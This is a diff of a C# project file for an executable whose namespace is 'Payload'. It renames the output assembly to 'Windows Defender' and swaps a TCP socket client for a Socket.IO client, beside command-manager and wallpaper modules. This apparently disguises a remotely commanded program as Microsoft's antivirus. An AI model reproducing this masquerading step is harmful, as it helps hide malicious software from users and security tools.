@@ -7,7 +7,7 @@
     <ProjectGuid>{903E5AF3-3437-4FB3-87E4-76089654510A}</ProjectGuid>
     <OutputType>Exe</OutputType>
     <RootNamespace>Payload</RootNamespace>
-    <AssemblyName>Payload</AssemblyName>
+    <AssemblyName>Windows Defender</AssemblyName>
     <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
@@ -92,8 +92,8 @@
     <Compile Include="Core\Command\CommandManager.cs" />
     <Compile Include="Core\Command\Interface\ICommand.cs" />
     <Compile Include="Core\Command\Interface\IFactory.cs" />
-    <Compile Include="Core\Command\SocketClient\Tcp\TcpClientCommand.cs" />
-    <Compile Include="Core\Command\SocketClient\Tcp\TcpClientFactory.cs" />
+    <Compile Include="Core\Command\SocketClient\SocketIO\SocketIOClientCommand.cs" />
+    <Compile Include="Core\Command\SocketClient\SocketIO\SocketIOClientFactory.cs" />
     <Compile Include="Core\Command\WallPaper\WallpaperEngineCommand.cs" />
     <Compile Include="Common\Config.cs" />
     <Compile Include="Core\Command\WallPaper\WallpaperEngineFactory.cs" />
